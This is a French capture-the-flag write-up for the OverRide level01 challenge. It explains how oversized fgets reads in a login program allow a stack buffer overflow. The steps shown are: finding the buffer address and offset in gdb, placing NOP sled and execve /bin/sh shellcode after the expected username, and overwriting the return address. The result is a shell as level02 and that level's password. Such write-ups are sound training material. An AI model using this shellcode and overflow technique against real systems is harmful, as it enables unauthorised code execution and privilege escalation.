# level01

On ne voit pas d'exécution de shell présente dans le code, le programme semble servir à authentifier un utilisateur, on voit que les fonctions `verify_user_name()` et `verify_user_pass()` servent à vérifier l'utilisation d'un couple username:pass qui serait dat_wil:admin.

En revanche, on voit que même en entrant les bons identifiants, il ne se passera rien, le programme affiche `nope, incorrect password...` dans tous les cas.

On voit 2 fgets qui lisent une quantité de caractères largement supérieure à la taille des buffer dans lesquels ils stockent le résultat, on va donc chercher à exploiter un buffer overflow et injecter un shellcode.

Vu qu'on a 2 buffer, l'idée va être de stocker un shellcode dans le premier buffer, et de faire pointer `eip` sur ce shell code en écrivant en dehors du second buffer.

Afin d'arriver au 2ème buffer, on doit d'abord passer la condition qui vérifie l'username, notre premier buffer doit donc commencer par l'username attendu: `dat_wil`.

On commence par trouver l'adresse de la variable du premier buffer sur gdb:

```sh
(gdb) info variable a_user_name
All variables matching regular expression "a_user_name":

Non-debugging symbols:
0x0804a040  a_user_name
```

Puis, on cherche l'offset du 2ème buffer avec le pattern generator:

```sh
(gdb) r
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

On trouve un offset de `80`.

On a désormais tout ce qu'il nous faut pour construire notre exploit, on va commencer par remplir notre premier buffer avec l'username, quelques NOP, et notre shellcode.

```sh
level01@OverRide:~$ echo $(perl -e 'print "dat_wil" . "\x90"x100 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";') > /tmp/first
```

Puis, on construit notre 2ème buffer avec notre padding de 80, puis une adresse se situant légèrement plus loin du début de notre premier buffer pour skip l'username et tomber dans les NOP, ici on a choisi une adresse 50 adresses plus loin.

```sh
level01@OverRide:~$ echo $(perl -e 'print "A"x80 . "\x72\xa0\x04\x08";') > /tmp/second
```

Et on peut lancer notre exploit

```sh
level01@OverRide:~$ cat /tmp/second - | cat /tmp/first - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
